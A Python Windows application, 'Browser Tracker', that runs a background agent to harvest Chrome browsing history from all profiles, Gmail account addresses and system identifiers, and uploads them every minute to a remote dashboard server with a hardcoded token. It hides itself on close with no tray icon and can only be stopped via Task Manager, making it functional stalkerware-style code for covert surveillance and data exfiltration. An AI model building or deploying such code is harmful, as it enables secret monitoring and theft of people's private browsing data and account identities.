"""
Browser Tracker - Integrated GUI Application with Built-in Agent
Complete Windows application with GUI interface and background monitoring
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import subprocess
import os
import sys
import json
import time
import signal
import requests
import sqlite3
import shutil
import tempfile
from datetime import datetime, timezone
import webbrowser
import socket
import getpass
import platform
from uuid import getnode
import hashlib

try:
    import pystray
    from PIL import Image, ImageDraw
    TRAY_AVAILABLE = True
except ImportError:
    TRAY_AVAILABLE = False

class BrowserAgent:
    """Integrated browser tracking agent"""

    def __init__(self, gui_callback=None):
        self.gui_callback = gui_callback
        self.running = False
        self.client_id = None
        self.monitor_thread = None

        # User data directory for storage
        self.user_data_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "BrowserTracker")
        os.makedirs(self.user_data_dir, exist_ok=True)

        # Configuration
        self.config = {
            "server_url": "https://browser-tracking.vercel.app",
            "api_token": "BrowserTracker2024SecureToken",
            "check_interval": 60,
            "batch_size": 50
        }

        # Data tracking
        self.sent_data_file = os.path.join(self.user_data_dir, 'sent_data.json')
        self.sent_data_hashes = self.load_sent_data()

        self.log("Browser Agent initialized")

    def log(self, message):
        """Log message to GUI if available"""
        try:
            if self.gui_callback:
                self.gui_callback(message)
            else:
                print(f"[AGENT] {message}")
        except:
            # Fallback if GUI not ready
            print(f"[AGENT] {message}")

    def load_sent_data(self):
        """Load previously sent data hashes"""
        try:
            if os.path.exists(self.sent_data_file):
                with open(self.sent_data_file, 'r') as f:
                    data = json.load(f)
                    return set(data.get('hashes', []))
            return set()
        except Exception as e:
            self.log(f"Error loading sent data: {e}")
            return set()

    def save_sent_data(self):
        """Save sent data hashes"""
        try:
            hashes_list = list(self.sent_data_hashes)[-1000:]  # Keep last 1000
            self.sent_data_hashes = set(hashes_list)

            data = {
                'hashes': hashes_list,
                'last_updated': datetime.now().isoformat()
            }
            with open(self.sent_data_file, 'w') as f:
                json.dump(data, f, indent=2)
            self.log(f"Saved {len(hashes_list)} data hashes")
        except Exception as e:
            self.log(f"Error saving sent data: {e}")

    def create_data_hash(self, entry):
        """Create unique hash for data entry"""
        # Use URL + title + profile for uniqueness (exclude timestamp to avoid duplicates)
        hash_string = f"{entry['url']}|{entry['title']}|{entry['profile_name']}"
        hash_result = hashlib.md5(hash_string.encode()).hexdigest()
        self.log(f"🔑 Hash created: {hash_result[:8]}... for {entry['title'][:30]}...")
        return hash_result

    def get_system_info(self):
        """Collect system information"""
        try:
            mac = getnode()
            mac_address = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()

            return {
                'hostname': socket.gethostname(),
                'mac_address': mac_address,
                'local_ip': local_ip,
                'username': getpass.getuser(),
                'os_info': {
                    'system': platform.system(),
                    'release': platform.release(),
                    'version': platform.version(),
                    'machine': platform.machine()
                }
            }
        except Exception as e:
            self.log(f"❌ Error getting system info: {e}")
            return None

    def get_chrome_history(self, limit=50):
        """Collect Chrome browsing history"""
        try:
            chrome_base = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
            if not os.path.exists(chrome_base):
                self.log("⚠️ Chrome not found")
                return []

            all_history = []
            profiles_found = 0

            # Check Default profile and numbered profiles
            profiles_to_check = ['Default']
            try:
                for item in os.listdir(chrome_base):
                    if item.startswith('Profile '):
                        profiles_to_check.append(item)
            except:
                pass

            for profile_name in profiles_to_check:
                profile_path = os.path.join(chrome_base, profile_name)
                history_db = os.path.join(profile_path, 'History')

                if not os.path.exists(history_db):
                    continue

                try:
                    profiles_found += 1

                    # Copy database to avoid locking issues
                    with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as temp_file:
                        temp_db = temp_file.name

                    shutil.copy2(history_db, temp_db)

                    # Read history
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()

                    cursor.execute('''
                        SELECT url, title, visit_count, last_visit_time
                        FROM urls
                        WHERE last_visit_time > 0
                        ORDER BY last_visit_time DESC
                        LIMIT ?
                    ''', (limit,))

                    profile_entries = 0
                    for row in cursor.fetchall():
                        url, title, visit_count, chrome_time = row

                        # Skip internal URLs
                        if self.should_skip_url(url):
                            continue

                        # Convert Chrome timestamp
                        if chrome_time > 0:
                            unix_timestamp = (chrome_time - 11644473600000000) / 1000000
                            visit_time = datetime.fromtimestamp(unix_timestamp, tz=timezone.utc)
                        else:
                            visit_time = datetime.now(tz=timezone.utc)

                        # Get Gmail account for this profile
                        gmail_account = self.get_gmail_account(profile_path)

                        entry = {
                            'url': url[:2000],
                            'title': (title or '')[:500],
                            'visit_time': visit_time.isoformat(),
                            'browser_type': 'Chrome',
                            'profile_name': profile_name,
                            'gmail_account': gmail_account
                        }

                        # Check if this entry was already sent
                        entry_hash = self.create_data_hash(entry)
                        if entry_hash not in self.sent_data_hashes:
                            all_history.append(entry)
                            profile_entries += 1
                        else:
                            self.log(f"⏭️ Skipping duplicate: {entry['title'][:30]}...")

                    conn.close()
                    os.unlink(temp_db)

                    if profile_entries > 0:
                        self.log(f"📁 {profile_name}: {profile_entries} fresh entries")

                except Exception as e:
                    self.log(f"❌ Error reading {profile_name}: {e}")
                    continue

            if len(all_history) > 0:
                self.log(f"📊 Fresh data: {len(all_history)} new entries from {profiles_found} profiles")

                # Sort by timestamp (newest first)
                all_history.sort(key=lambda x: x['visit_time'], reverse=True)

                # Select batch
                batch_size = self.config.get('batch_size', 50)
                selected_entries = all_history[:batch_size]

                self.log(f"📦 Selected {len(selected_entries)} entries for transmission")
                return selected_entries
            else:
                self.log("ℹ️ No new data to send")
                return []

        except Exception as e:
            self.log(f"❌ Error getting Chrome history: {e}")
            return []

    def get_gmail_account(self, profile_path):
        """Extract Gmail account from Chrome profile"""
        try:
            prefs_file = os.path.join(profile_path, 'Preferences')
            if not os.path.exists(prefs_file):
                return None

            with open(prefs_file, 'r', encoding='utf-8') as f:
                prefs = json.load(f)

            # Check account_info
            account_info = prefs.get('account_info', [])
            for account in account_info:
                email = account.get('email', '')
                if '@gmail.com' in email.lower():
                    return email

            # Check signin info
            signin = prefs.get('signin', {})
            allowed_usernames = signin.get('allowed_usernames', [])
            for username in allowed_usernames:
                if '@gmail.com' in username.lower():
                    return username

            return None
        except:
            return None

    def should_skip_url(self, url):
        """Check if URL should be skipped"""
        skip_patterns = [
            'chrome://', 'chrome-extension://', 'edge://', 'about:',
            'file://', 'localhost', '127.0.0.1', '192.168.', '10.0.', '172.16.'
        ]

        url_lower = url.lower()
        return any(pattern in url_lower for pattern in skip_patterns)

    def send_data(self, endpoint, data):
        """Send data to server"""
        try:
            headers = {
                'Authorization': f'Bearer {self.config["api_token"]}',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }

            url = f'{self.config["server_url"]}/api/{endpoint}'

            response = requests.post(
                url,
                json=data,
                headers=headers,
                timeout=30
            )

            return response.status_code == 200, response

        except Exception as e:
            self.log(f"❌ Error sending data to {endpoint}: {e}")
            return False, None

    def register_client(self):
        """Register client with server"""
        try:
            self.log("🔗 Registering client...")
            system_info = self.get_system_info()
            if not system_info:
                return False

            success, response = self.send_data('register', system_info)
            if success and response:
                data = response.json()
                if data.get('success'):
                    self.client_id = data.get('client_id')
                    self.log(f"✅ Client registered with ID: {self.client_id}")
                    return True

            self.log("❌ Failed to register client")
            return False

        except Exception as e:
            self.log(f"❌ Error registering client: {e}")
            return False

    def collect_and_send_data(self):
        """Main data collection and transmission"""
        try:
            self.log(f"🔄 Collecting data... ({datetime.now().strftime('%H:%M:%S')})")

            # Ensure client is registered
            if not self.client_id:
                if not self.register_client():
                    return False

            # Collect browsing history (only fresh data)
            history = self.get_chrome_history(50)
            if not history:
                return True

            # Send browsing data
            self.log(f"📤 Sending {len(history)} fresh entries...")
            success, response = self.send_data('browsing-data', {
                'client_id': self.client_id,
                'browsing_data': history
            })

            if success:
                # Mark data as sent
                for entry in history:
                    entry_hash = self.create_data_hash(entry)
                    self.sent_data_hashes.add(entry_hash)

                # Save sent data hashes
                self.save_sent_data()

                self.log(f"✅ {len(history)} fresh entries sent successfully")
                return True
            else:
                self.log(f"❌ Failed to send data")
                return False

        except Exception as e:
            self.log(f"❌ Error in collect_and_send_data: {e}")
            return False

    def start_monitoring(self):
        """Start monitoring in background thread"""
        if self.running:
            self.log("⚠️ Monitoring already running")
            return False

        self.log("🚀 Starting Browser Tracking Agent...")
        self.running = True
        self.monitor_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
        self.monitor_thread.start()
        return True

    def stop_monitoring(self):
        """Stop monitoring"""
        if not self.running:
            self.log("ℹ️ Monitoring not running")
            return False

        self.log("🛑 Stopping monitoring...")
        self.running = False

        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=5)

        return True

    def monitoring_loop(self):
        """Main monitoring loop"""
        self.log(f"🔄 Starting monitoring loop...")

        while self.running:
            try:
                # Collect and send data
                self.collect_and_send_data()

                # Wait for next collection
                interval = self.config.get('check_interval', 60)
                self.log(f"⏳ Next collection in {interval} seconds...")

                for _ in range(interval):
                    if not self.running:
                        break
                    time.sleep(1)

            except Exception as e:
                self.log(f"❌ Error in monitoring loop: {e}")
                time.sleep(60)

        self.log("🛑 Monitoring stopped")

    def test_connection(self):
        """Test connection to server"""
        try:
            self.log("🔗 Testing server connection...")
            response = requests.get(f"{self.config['server_url']}/health", timeout=10)

            if response.status_code == 200:
                data = response.json()
                self.log(f"✅ Server online: {data.get('status', 'unknown')}")
                return True
            else:
                self.log(f"❌ Server returned status {response.status_code}")
                return False

        except Exception as e:
            self.log(f"❌ Connection failed: {e}")
            return False

class BrowserTrackerGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Browser Tracker - Integrated Application")
        self.root.geometry("700x600")
        self.root.resizable(True, True)

        # Set icon
        try:
            self.root.iconbitmap(default="icon.ico")
        except:
            pass

        # Variables
        self.auto_start = tk.BooleanVar(value=True)
        self.run_in_background = tk.BooleanVar(value=True)

        # Setup GUI first (so log_text exists)
        self.setup_gui()
        # No system tray setup needed

        # Initialize integrated agent AFTER GUI setup
        self.agent = BrowserAgent(gui_callback=self.log)

        # Auto-start agent if enabled (with delay)
        if self.auto_start.get():
            self.root.after(2000, self.start_agent)  # Start after 2 seconds

        # Setup window close handler
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        # Start status update thread
        self.start_status_thread()
    
    def setup_gui(self):
        """Setup main GUI interface"""
        
        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Title
        title_label = ttk.Label(main_frame, text="Browser Tracker", 
                               font=("Arial", 16, "bold"))
        title_label.grid(row=0, column=0, columnspan=2, pady=(0, 20))
        
        # Status frame
        status_frame = ttk.LabelFrame(main_frame, text="Status", padding="10")
        status_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        self.status_label = ttk.Label(status_frame, text="Checking status...", 
                                     font=("Arial", 10))
        self.status_label.grid(row=0, column=0, sticky=tk.W)
        
        self.status_indicator = tk.Canvas(status_frame, width=20, height=20)
        self.status_indicator.grid(row=0, column=1, padx=(10, 0))
        
        # Control buttons frame
        control_frame = ttk.LabelFrame(main_frame, text="Controls", padding="10")
        control_frame.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        self.start_button = ttk.Button(control_frame, text="Start Agent", 
                                      command=self.start_agent)
        self.start_button.grid(row=0, column=0, padx=(0, 10))
        
        self.stop_button = ttk.Button(control_frame, text="Stop Agent", 
                                     command=self.stop_agent)
        self.stop_button.grid(row=0, column=1, padx=(0, 10))
        
        self.dashboard_button = ttk.Button(control_frame, text="Open Dashboard", 
                                          command=self.open_dashboard)
        self.dashboard_button.grid(row=0, column=2)
        
        # Settings frame
        settings_frame = ttk.LabelFrame(main_frame, text="Settings", padding="10")
        settings_frame.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        ttk.Checkbutton(settings_frame, text="Auto-start agent when app opens",
                       variable=self.auto_start).grid(row=0, column=0, sticky=tk.W)

        ttk.Checkbutton(settings_frame, text="Run in background when closed",
                       variable=self.run_in_background).grid(row=1, column=0, sticky=tk.W)
        
        # Activity log frame
        log_frame = ttk.LabelFrame(main_frame, text="Activity Log", padding="10")
        log_frame.grid(row=4, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=10, width=70)
        self.log_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(4, weight=1)
        log_frame.columnconfigure(0, weight=1)
        log_frame.rowconfigure(0, weight=1)
        
        # Initial log
        self.log("🚀 Browser Tracker Integrated Application started")
        self.log("📊 Dashboard: https://browser-tracking.vercel.app")
        self.log("🤖 Built-in agent ready")
    
    # System tray removed - pure background mode
    
    def log(self, message):
        """Add message to activity log"""
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            log_entry = f"[{timestamp}] {message}\n"

            # Check if log_text exists
            if hasattr(self, 'log_text'):
                self.log_text.insert(tk.END, log_entry)
                self.log_text.see(tk.END)

                # Keep log size manageable
                lines = self.log_text.get("1.0", tk.END).split('\n')
                if len(lines) > 100:
                    self.log_text.delete("1.0", "10.0")
            else:
                # Fallback if GUI not ready
                print(f"[{timestamp}] {message}")
        except Exception as e:
            # Ultimate fallback
            print(f"[LOG ERROR] {message} (Error: {e})")
    
    def check_agent_status(self):
        """Check if integrated agent is running"""
        if self.agent.running:
            self.update_status("Agent Running", "green")
        else:
            self.update_status("Agent Stopped", "red")
    
    def update_status(self, text, color):
        """Update status display"""
        self.status_label.config(text=text)
        
        # Update status indicator
        self.status_indicator.delete("all")
        self.status_indicator.create_oval(2, 2, 18, 18, fill=color, outline="black")
        
        # Update buttons
        if self.agent.running:
            self.start_button.config(state="disabled")
            self.stop_button.config(state="normal")
        else:
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
    
    def start_agent(self):
        """Start the integrated browser tracking agent"""
        try:
            self.log("🚀 Starting integrated browser tracking agent...")

            # Test connection first
            if not self.agent.test_connection():
                self.log("❌ Cannot connect to server")
                messagebox.showerror("Connection Error", "Cannot connect to server. Please check your internet connection.")
                return

            # Start monitoring
            if self.agent.start_monitoring():
                time.sleep(1)  # Wait for agent to start
                self.check_agent_status()
                self.log("✅ Integrated agent started successfully")
                messagebox.showinfo("Success", "Browser tracking agent started successfully!")
            else:
                self.log("❌ Failed to start agent")
                messagebox.showerror("Error", "Failed to start browser tracking agent")

        except Exception as e:
            self.log(f"❌ Error starting agent: {e}")
            messagebox.showerror("Error", f"Error starting agent: {e}")
    
    def stop_agent(self):
        """Stop the integrated browser tracking agent"""
        try:
            self.log("🛑 Stopping integrated browser tracking agent...")

            if self.agent.stop_monitoring():
                time.sleep(1)  # Wait for agent to stop
                self.check_agent_status()
                self.log("✅ Integrated agent stopped")
                messagebox.showinfo("Success", "Browser tracking agent stopped")
            else:
                self.log("❌ Failed to stop agent")
                messagebox.showerror("Error", "Failed to stop browser tracking agent")

        except Exception as e:
            self.log(f"❌ Error stopping agent: {e}")
            messagebox.showerror("Error", f"Error stopping agent: {e}")
    
    def open_dashboard(self):
        """Open dashboard in browser"""
        webbrowser.open("https://browser-tracking.vercel.app")
        self.log("📊 Dashboard opened in browser")
    
    def start_status_thread(self):
        """Start background thread to update status"""
        def update_status_loop():
            while True:
                try:
                    self.check_agent_status()
                    time.sleep(30)  # Check every 30 seconds
                except:
                    break
        
        thread = threading.Thread(target=update_status_loop, daemon=True)
        thread.start()
    
    def on_closing(self):
        """Handle window close event"""
        if self.run_in_background.get():
            # Show notification about background operation
            result = messagebox.askyesno("Run in Background",
                              "Browser Tracker akan tetap berjalan di background.\n\n"
                              "✅ Agent akan terus mengumpulkan data browsing\n"
                              "✅ Tidak ada icon di system tray\n"
                              "✅ Berjalan secara invisible\n\n"
                              "Untuk membuka kembali, jalankan aplikasi lagi.\n"
                              "Untuk menghentikan, gunakan Task Manager.\n\n"
                              "Lanjutkan ke background mode?")

            if result:
                self.root.withdraw()  # Hide window completely
                self.log("🔽 Running in background - No system tray")

                # Optional: Show final notification
                messagebox.showinfo("Background Mode",
                                  "✅ Browser Tracker sekarang berjalan di background.\n\n"
                                  "Agent akan terus mengumpulkan data browsing.\n"
                                  "Tidak ada icon di system tray.\n\n"
                                  "Untuk membuka: Jalankan aplikasi lagi\n"
                                  "Untuk stop: Task Manager > End python.exe")
            else:
                # User chose not to run in background
                self.quit_app()
        else:
            self.quit_app()
    
    def quit_app(self):
        """Quit application completely"""
        if messagebox.askyesno("Confirm Exit",
                              "Are you sure you want to EXIT Browser Tracker?\n\n"
                              "⚠️ This will STOP the tracking agent completely.\n"
                              "💡 Tip: Use 'X' button to minimize to tray instead."):
            # Stop the integrated agent
            self.agent.stop_monitoring()
            self.log("🔚 Application shutting down - Agent stopped")

            self.root.quit()
            self.root.destroy()
    
    def run(self):
        """Start the GUI application"""
        self.root.mainloop()

def main():
    """Main function"""
    try:
        app = BrowserTrackerGUI()
        app.run()
    except Exception as e:
        messagebox.showerror("Error", f"Failed to start Browser Tracker: {e}")

if __name__ == "__main__":
    main()
